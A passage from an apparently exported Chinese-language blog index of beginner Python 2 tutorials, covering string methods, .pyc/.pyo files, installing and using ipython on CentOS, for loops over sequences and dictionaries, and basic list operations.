是否包含在 string 中，如果 beg 和 end 指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回-1 string.format() 格式化字符串 string.index(str, beg=0, end=len(string)) 跟find()方法一样，只不过如果str不在 string中会报一个异常. string.isalnum() 如果 string 至少有一个字符并且所有字符都是字母或数字则返回 True,否则返回 False string.isalpha() 如果 string 至少有一个字符并且所有字符都是字母则返回 True,否则返回 False string.isdecimal() 如果 string 只包含十进制数字则返回 True 否则返回 False. string.isdigit() 如果 string 只包含数字则返回 True 否则返回 False. string.islower() 如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False string.isnumeric() 如果 string 中只包含数字字符，则返回 True，否则返回 False string.isspace() 如果 string 中只包含空格，则返回 True，否则返回 False. string.istitle() 如果 string 是标题化的(见 title())则返回 True，否则返回 False string.isupper() 如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True，否则返回 False string.join(seq) 以 string 作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串 string.ljust(width) 返回一个原字符串左对齐,并使用空格填充至长度 width 的新字符串 string.lower() 转换 string 中所有大写字符为小写. string.lstrip() 截掉 string 左边的空格 string.maketrans(intab, outtab]) maketrans() 方法用于创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。 max(str) 返回字符串 str 中最大的字母。 min(str) 返回字符串 str 中最小的字母。 string.partition(str) 有点像 find()和 split()的结合体,从 str 出现的第一个位置起,把 字 符 串 string 分 成 一 个 3 元 素 的 元 组 (string_pre_str,str,string_post_str),如果 string 中不包含str 则 string_pre_str == string. string.replace(str1, str2, num=string.count(str1)) 把 string 中的 str1 替换成 str2,如果 num 指定，则替换不超过 num 次. string.rfind(str, beg=0,end=len(string) ) 类似于 find()函数，不过是从右边开始查找. string.rindex( str, beg=0,end=len(string)) 类似于 index()，不过是从右边开始. string.rjust(width) 返回一个原字符串右对齐,并使用空格填充至长度 width 的新字符串 string.rpartition(str) 类似于 partition()函数,不过是从右边开始查找. string.rstrip() 删除 string 字符串末尾的空格. string.split(str=””, num=string.count(str)) 以 str 为分隔符切片 string，如果 num有指定值，则仅分隔 num 个子字符串 string.splitlines([keepends]) 按照行(‘\r’, ‘\r\n’, \n’)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。 string.startswith(obj, beg=0,end=len(string)) 检查字符串是否是以 obj 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查. string.strip([obj]) 在 string 上执行 lstrip()和 rstrip() string.swapcase() 翻转 string 中的大小写 string.title() 返回”标题化”的 string,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle()) string.translate(str, del=””) 根据 str 给出的表(包含 256 个字符)转换 string 的字符,要过滤掉的字符放到 del 参数中 string.upper() 转换 string 中的小写字母为大写 string.zfill(width) 返回长度为 width 的字符串，原字符串 string 右对齐，前面填充0 string.isdecimal() isdecimal()方法检查字符串是否只包含十进制字符。这种方法只存在于unicode对象。]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 的文件类型]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.3%20Python%20%E7%9A%84%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%2F4.%20Python%20%E7%9A%84%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[Python 的文件类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 的使用我们可以用解释器交互方式 python 和 ipython，也可以建立一个程序文件。 1.源代码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 源代码文件以 “py” 为扩展名，由 Python 程序解释，不需要编译。 1[root@192 day01]# vim 1.py &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入内容 12#!/usr/bin/pythonprint 'hello world' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：第一行必须写 #!/usr/bin/python ，因为第一行表示用什么解释器来解释文件，如果不写就是以 bash 解释。 12345[root@192 day01]# python 1.pyhello world[root@192 day01]# chmod u+x 1.py [root@192 day01]# ./1.pyhello world &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 的执行和 bash 很相似。 2.字节代码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 源码文件经编译后生成的扩展名为 “pyc” 的文件 编译方法： import py_compilepy_compile.compile(‘hello.py’) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建文件 1[root@192 day01]# vim 2.py 写入内容 12345#!/usr/bin/python import py_compile py_compile.compile('1.py') &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行 1[root@192 day01]# python 2.py &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发现执行以后什么输出都没有 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls 查看 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发现多了一个 1.pyc ，这个 1.pyc 就是对 1.py 进行编译 后产生。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看文件类型 12[root@192 day01]# file 1.pyc1.pyc: python 2.6 byte-compiled &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示被字节编译过&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看 1.pyc 文件，发现是二进制文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行 12[root@192 day01]# python 1.pychello world 3.优化代码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经过优化的源码文件，扩展名为 “pyo” 编译方法： python -o -m py_compile hello.py-O 表示优化-m 表示模块 1[root@192 day01]# python -O -m py_compile 1.py &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生成一个 1.pyo 的文件。1.pyo 也是经过编译的，只是多了有一个优化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行 12[root@192 day01]# python 1.pyohello world &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不想让别人查看源码文件就可以把源码文件编译成 pyc 或 pyo 的文件，不过建议使用源码文件。]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 准备-ipython]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.2%20Python%20%E7%9A%84%E5%AE%89%E8%A3%85%2F3.%20Pyhton%20%E5%87%86%E5%A4%87-%20ipython%2F</url>
    <content type="text"><![CDATA[Python 准备-ipythonupdate&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发现ipython notebook 灰常方便，主要是写一些代码片段的时候，debug起来甚至跟pycharm有的一拼。配置好服务器版本后，打开浏览器就能用，一定程度上提升了效率。具体如何配置ipython notebook的service可以看官网，值得注意的一点是，如果不配置直接本地运行的化，只能通过localhost:[port]打开，无法远程访问。 安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装是没什么好说的，yum install -y python-pip 然后 pip install ipython 就完了，但是，很多时候我们要在不同的python版本间切换。比如自己习惯在python3版本下工作，但是很多时候学习一些书中的例子 时使用的是python2的版本。因此这里建议同时安装ipython和ipython3两个版本。从我自己使用的情况来看，同时安装两个版本的 ipython并没有冲突，两个版本间的安装包是相互独立的，只是两个版本的ipython会共享配置文件。需要使用python2的环境时就在终端执行 ipython，需要使用python3版本的时候就在终端执行ipython3。 1234567891011121314151617tianjun@tianjun-ASUS:~/.config/ipython$ ipythonPython 2.7.5+ (default, Sep 19 2013, 13:48:49) Type "copyright", "credits" or "license" for more information.IPython 1.1.0 -- An enhanced Interactive Python.? -&gt; Introduction and overview of IPython's features.%quickref -&gt; Quick reference.help -&gt; Python's own help system.object? -&gt; Details about 'object', use 'object??' for extra details. In [1]: exittianjun@tianjun-ASUS:~/.config/ipython$ ipython3Python 3.3.2+ (default, Oct 9 2013, 14:50:09) Type "copyright", "credits" or "license" for more information. IPython 1.1.0 -- An enhanced Interactive Python.? -&gt; Introduction and overview of IPython's features.%quickref -&gt; Quick reference.help -&gt; Python's own help system.object? -&gt; Details about 'object', use 'object??' for extra details. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么怎么安装不同版本的ipython呢？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;谈到不同版本python的共存，一个不可避免的问题就是给不同的python版本安装对应的软件包。一个比较好的解决办法是先安装 virtualenv这个工具，然后生成一个独立的工作目录，在该目录下安装不同版本的工具包。但是我嫌这个每次都要切换到工作目录下，还要执行 activate，比较麻烦。所以建议分别安装pip和pip3工具。 1yum install -y pip pip3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后想安装python2版本的软件包就用命令 1pip install ipython &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想安装python3版本对应的软件包就用命令 1pip3 install ipython3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;类似的，我们可以安装好不同python版本对应的numpy，scipy,matplotlib,sklearn等等。 常用功能1. 自动补全&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ipython最方便的第一个功能是tab自动补全。我常用来查看某个类的方法，或者是某个包中提供的函数。这个很是有用，有时候忘了某个函数是怎么写的时候，用自动补全查看下。例如： 2. 查看帮助文档和源码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如，我想查看os.walk这个函数怎么用，可以在后面加上一个问号（os.walk？）再按enter。如果想查看更详细的源码实现，则加上两个问号，即（os.walk？？），这个功能经常用到，很是方便，有时候不知道某个参数代表什么意思的时候，就可以查看下帮助文档。 3. 把ipython当作终端用在ipython中可以使用命令行中的许多命令，我常常用来切换目录，编辑或是删除文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，还可以执行外部unix命令，不过需要在前面加入感叹号！，比如，需要编辑文件的时候，我就经常使用 !vim abc.py来运行vim程序。当然，也可以直接使用edit abc.py来编辑文件，该命令会自动启动vim，但我发现如果使用edit命令的话，编辑完保存文件并退出的时候ipython会自动运行该文件，这个h好处是可以接着在终端调用刚刚打开的文件中的变量和函数，不过这有时候会很烦人，所以我经常使用!vim abc.py来编辑文件。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ipython有许多个性化的设置，可以在命令行中输入 ipython profile create，这会在 ~/.config/ipython目录下生成配置文件，查看README有详细说明。 4. 书签&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些工作目录可能经常使用，每次都cd很麻烦。所以，我们可以在第一次切换到该目录下后，使用bookmark 命令，以后直接一次cd即可，具体使用方法如下。 5. 记录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候我们希望将ipython中运行的命令保存到文件中，这时候可以使 用 logstart，logoff命令实现。 6. 调试和运行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;run abc.py即可运行脚本，如果需要调试的时候，加入-d参数，即 run -d abc.py即可。需要注意的是，运行脚本后，变量即保存在此时的ipython运行环境中了，我们可以对脚本中的变量做进一步的分析和修改。关于调试， 最常使用的就是 s(step), n(next), c(continue),p(print)这4个命令。 l(list)命令用于显示上下文环境。例如：l 20 （显示当前行上下共20行代码） l 1, 30 （显示从1到第30行代码） break 用于设置断点。例如： break 10 （在第10行设置断点），break （查看断点信息）， condition 1 pression 给断点1设定条件pression, 这里pression是python表达式，当条件满足时在该点停下来 disable 1,(禁用断点1), enable 1, (恢复断点1), clear 1,(删除断点1), ignore 1 3,(在执行到断点1第四次时才启用该断点), commands 1,(给断点1设定触发动作，每次运行到该断点时，执行设定的python表达式，比如用于观察某一变量的变化情况。输入end结束commands)更高级的运用可以查看pdb的帮助文档。 7. 其他&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其他比较有用的是pylab，在绘图时能够交互，从而使得修改绘图命令时，修改后的结果能够立即在图像上显示出来。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ipython notebook 感觉很鸡肋，平时很少用到。]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 的安装]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.2%20Python%20%E7%9A%84%E5%AE%89%E8%A3%85%2F2.%20Python%20%E7%9A%84%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Python 的安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;python 官网 1. linux 的 python 安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CentOS 6.5 系统自带 Python 2.6 12[root@192 ~]# rpm -q pythonpython-2.6.6-51.el6.x86_64 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CentOS 7.0 系统自带 PYthon 2.7 12[root@localhost ~]# rpm -q pythonpython-2.7.5-48.el7.x86_64 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 linux 系统下，直接输入 python 就可以进入 pyhton 的命令行模式，使用 exit（） 退出 123456[root@192 ~]# pythonPython 2.6.6 (r266:84292, Nov 22 2013, 12:16:22) [GCC 4.4.7 20120313 (Red Hat 4.4.7-4)] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; print 'hello world'hello world &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原生的 python 带的命令行不是很多，也不能使用 tab 键命令补齐。这时候需要安装一个 python shell 模块，叫 “ipython” 的模块，就可以进行命令补齐。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果计算机可以上网，那么可以直接使用网络安装，使用 命令 pip ，如果没有这个命令，需要先安装，需要先安装 epel 扩展源 1[root@192 ~]# yum install -y python-pip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成后再安装 ipython 1[root@192 ~]# pip install ipython &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为 CentOS 6.5 自带的 python 为 2.6 版本比较底，直接 pip 安装有可能高版本会报错，需要在包名后边加上低版本版本号，来安装较低版本。 1[root@192 ~]# pip install ipython==1.2.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看安装模块命令 pip list 1234567891011121314[root@192 ~]# pip listYou are using pip version 7.1.0, however version 9.0.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.argparse (1.2.1)distribute (0.6.10)iniparse (0.3.1)ipython (1.2.1)pip (7.1.0)pycurl (7.19.0)pygpgme (0.1)pyxdg (0.18)setuptools (0.6rc11)urlgrabber (3.9.1)yum-metadata-parser (1.1.2) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成，直接输入 ipython 就可以进如 python 命令行模式的，这个模式下可以使用 tab 键进行命令补齐了，退出使用命令 exit 1234567891011[root@192 ~]# ipythonPython 2.6.6 (r266:84292, Nov 22 2013, 12:16:22) Type "copyright", "credits" or "license" for more information.IPython 1.2.1 -- An enhanced Interactive Python.? -&gt; Introduction and overview of IPython's features.%quickref -&gt; Quick reference.help -&gt; Python's own help system.object? -&gt; Details about 'object', use 'object??' for extra details.In [1]: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装 ipython 报错 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用命令 1[root@localhost ~]# yum install -y python-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果机器不能上网，那么需要在可以上网的机器上下载安装包拷贝到机器上安装。下载地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后拷贝到机器解压 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压以后有个 setup.py 脚本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用命令 setup.py install 安装，安装完成使用 pip list 查看是否安装成功。 2.windows 安装 python （只需要了解即可）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先在Python官网 下载 python 安装包 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载安装以后，c 盘下会有一个 python 文件夹 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后把 python 路径加入 windows 的环境变量 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入 cmd 命令行模式，输入 python 就可以进入 python 命令行模式]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 流程控制-for循环字典]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F2.3%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6-for%20%E5%AD%97%E5%85%B8%2FPython%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6-for%E5%BE%AA%E7%8E%AF%20%E5%AD%97%E5%85%B8%2F</url>
    <content type="text"><![CDATA[Python 流程控制-for循环 字典&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python for循环不但可以遍历序列，还可以遍历字典。 通过 for 循环遍历字典&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先定义一个字典 123456789In [4]: dic = &#123;'a':1, 'b':2&#125;In [5]: dic.fromkeys('abcde',100)Out[5]: &#123;'a': 100, 'b': 100, 'c': 100, 'd': 100, 'e': 100&#125;In [6]: dic1 = dic.fromkeys('abcde',100)In [7]: dic1Out[7]: &#123;'a': 100, 'b': 100, 'c': 100, 'd': 100, 'e': 100&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;遍历字典里的 key （直接遍历字典，不加任何方法就是遍历字典的 key） 1234567891011121314In [8]: for k in dic: ...: print k ...: abIn [9]: for k in dic1: ...: print k ...: acbed &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;取字典里的值（要遍历 value 就要加上 dic1[k] 索引下标来取） 12345678In [10]: for k in dic1: ...: print k,dic1[k] ...: a 100c 100b 100e 100d 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式化的输出 12345678In [11]: for k in dic1: ...: print "%s --&gt; %s" % (k,dic1[k]) ...: a --&gt; 100c --&gt; 100b --&gt; 100e --&gt; 100d --&gt; 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果只要占一行就在后边加逗号 1234In [12]: for k in dic1: ...: print "%s --&gt; %s" % (k,dic1[k]), ...: a --&gt; 100 c --&gt; 100 b --&gt; 100 e --&gt; 100 d --&gt; 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还可以把字典作为列表遍历，取到每个元素也就是元组（使用 items() 遍历，通过一个值取出来就是元组） 123456789In [13]: dic1.items()Out[13]: [('a', 100), ('c', 100), ('b', 100), ('e', 100), ('d', 100)]In [14]: for i in dic1.items():print i('a', 100)('c', 100)('b', 100)('e', 100)('d', 100) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后可以对元组进行拆分（使用 items(),通过两个值来取就可以拆分元组） 123456In [15]: for k,v in dic1.items():print k,va 100c 100b 100e 100d 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以用 dic1.iteritems() ，只不过它返回是个对象；而 items() 是个列表。可以对这个对象进行遍历，用两个值（k和v）来接收，就可以得到两个值 key 和 value 123456In [16]: for k,v in dic1.iteritems():print k,va 100c 100b 100e 100d 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上就是通过 for 循环遍历字典的方法 实例实例1：乘法口诀表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两个循环 123456#!/usr/bin/pythonfor i in xrange(1,10): #控制行数 for j in xrange(1,i+1): #每列的列数不一样，用j表示，控制列数 print "%s * %s = %s" % (j, i j*i), #用逗号不输出换行符 print #直接print输出换行,或者使用 print "\n" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果 12345678910[root@localhost ~]# python 3.py 1*1=11*2=2 2*2=41*3=3 2*3=6 3*3=91*4=4 2*4=8 3*4=12 4*4=161*5=5 2*5=10 3*5=15 4*5=20 5*5=251*6=6 2*6=12 3*6=18 4*6=24 5*6=30 6*6=361*7=7 2*7=14 3*7=21 4*7=28 5*7=35 6*7=42 7*7=491*8=8 2*8=16 3*8=24 4*8=32 5*8=40 6*8=48 7*8=56 8*8=641*9=9 2*9=18 3*9=27 4*9=36 5*9=45 6*9=54 7*9=63 8*9=72 9*9=81]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python for 循环语句]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F2.2%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6-for%20%E5%BA%8F%E5%88%97%2F13.%20Python%20for%20%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[Python for 循环语句&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。 语法：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for循环的语法格式如下： 12for iterating_var in sequence: statements(s) 流程图： 实例1234567891011#!/usr/bin/python# -*- coding: UTF-8 -*- for letter in 'Python': # 第一个实例 print '当前字母 :', letter fruits = ['banana', 'apple', 'mango']for fruit in fruits: # 第二个实例 print '当前水果 :', fruit print "Good bye!" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例输出结果: 12345678910当前字母 : P当前字母 : y当前字母 : t当前字母 : h当前字母 : o当前字母 : n当前水果 : banana当前水果 : apple当前水果 : mangoGood bye! 通过序列索引迭代&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外一种执行循环的遍历方式是通过索引，如下实例： 12345678#!/usr/bin/python# -*- coding: UTF-8 -*- fruits = ['banana', 'apple', 'mango']for index in range(len(fruits)): print '当前水果 :', fruits[index] print "Good bye!" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例输出结果： 1234当前水果 : banana当前水果 : apple当前水果 : mangoGood bye! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例我们使用了内置函数 len() 和 range(),函数 len() 返回列表的长度，即元素的个数。 range返回一个序列的数。 循环使用 else 语句&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 python 中，for … else 表示这样的意思，for 中的语句和普通的没有区别，else 中的语句会在循环正常执行完（即 for 不是通过 break 跳出而中断的）的情况下执行，while … else 也是一样。 1234567891011#!/usr/bin/python# -*- coding: UTF-8 -*- for num in range(10,20): # 迭代 10 到 20 之间的数字 for i in range(2,num): # 根据因子迭代 if num%i == 0: # 确定第一个因子 j=num/i # 计算第二个因子 print '%d 等于 %d * %d' % (num,i,j) break # 跳出当前循环 else: # 循环的 else 部分 print num, '是一个质数' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例输出结果： 1234567891010 等于 2 * 511 是一个质数12 等于 2 * 613 是一个质数14 等于 2 * 715 等于 3 * 516 等于 2 * 817 是一个质数18 等于 2 * 919 是一个质数]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 流程控制-for循环序列]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F2.2%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6-for%20%E5%BA%8F%E5%88%97%2F14.%20Python%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6-%20for%20%E5%BE%AA%E7%8E%AF%E5%BA%8F%E5%88%97%2F</url>
    <content type="text"><![CDATA[&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;什么是循环： 循环是一个结构，导致程序要重复一定的次数。 条件循环也是如此，当条件为假，循环结束。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。 语法12for iterating_var in sequence: statements(s) 流程图 实例1234#!/usr/bin/pythonfor i in range(10)： print i &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 123456789100123456789 range range可以快速的生成一个序列 range（i，j,[,步进值]） 如果所创建对象为整数，可以用range i为初始值，不选默认为0 j为终止值，但不包括在范围内 步进值默认为1 for循环实例实例1：显示1-10，能被2整除的数12345#!/usr/bin/pythonfor i in range(1,11): i % 2 == 0: print i &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 12345246810 实例2：123#!/usr/bin/pythonprint [i for i in range(1,11)]: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 1234567891012345678910 实例3123#!/usr/bin/pythonprint [i*2 for i in range(1,11)]: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 123456789102468101214161820 实例41234#!/usr/bin/pythonfor i in [i**2 for i in range(1,11)]: print i &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 12345678910149162536496481100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种写法叫做列表重写，凡是列表都可以进行重写。 实例5：1+2+3+……+100=123456#!/usr/bin/pythonsum = 0for i in range(1,101): sum = sum + i #或者 sum += iprint sum &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 15050 xrange 生成一个可迭代的对象 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;xrange返回的是一个对象不是一个赋值的列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是可以对xrange这个对象进行遍历 迭代遍历 遍历序列：将序列中各个元素取出来 直接从序列取值 通过索引来取值 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：“迭代”，只重复执行一个指令。 实例实例1：1234567#!/usr/bin/pythonfruits = ['banana', 'apple', 'mango']for fruit in fruits: print '当前水果 :', fruit print "Good bye!" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 1234当前水果 : banana当前水果 : apple当前水果 : mangoGood bye! 实例2：1234567#!/usr/bin/pythonfruits = ['banana', 'apple', 'mango']for index in range(len(fruits)): print '当前水果 :', fruits[index] print "Good bye!" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 1234当前水果 : banana当前水果 : apple当前水果 : mangoGood bye!]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 列表（list）]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.7%20%E5%88%97%E8%A1%A8%2F9.%20Python%20%E7%9A%84%E5%88%97%E8%A1%A8(list)%2F</url>
    <content type="text"><![CDATA[&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;序列是 Python 中最基本的数据结构。序列中的每个元素都分配一个数字-它的位置，或索引，第一个索引就是0，第二个索引是1，依此类推。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 有6个序列的内置类型，但最常见的是列表和元组。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;序列都可以进行的操作包括索引、切片、加、乘、检查成员。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此外，Python 已经内置确定序列的长度以及确定最大和最小的元素的方法。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列表是最常用的 Python 的数据类型，它可以作为一个方括号内的逗号分割值出现。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列表的数据项不需要具有相同的类型。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列表是处理一组有序项目的数据结构，即可以在列表中存储一个序列的项目。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列表是可变类型的数据。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可。 123456789101112131415161718In [49]: list1 = ['python','linxu',1997,2000]In [50]: list2 = [1,2,3,4,5];In [51]: list3 = ["a","b","c","d"];In [52]: list4 = ['a',1,(4,),[5,6,7]];In [53]: type(list1)Out[53]: listIn [54]: type(list2)Out[54]: listIn [55]: type(list3)Out[55]: listIn [56]: type(list4)Out[56]: list &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建一个空的列表 123456789In [57]: list5 = []In [58]: type(list5)Out[58]: listIn [59]: list6 = list()In [60]: type(list6)Out[60]: list &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列表中追加值 1234In [61]: list5.append('hello')In [62]: list5Out[62]: ['hello'] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改列表中一个值 1234567In [63]: list4Out[63]: ['a', 1, (4,), [5, 6, 7]]In [64]: list4[0] = 'b'In [65]: list4Out[65]: ['b', 1, (4,), [5, 6, 7]] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将两个列表变成一个大的列表 12In [66]: list4 + list5Out[66]: ['b', 1, (4,), [5, 6, 7], 'hello'] 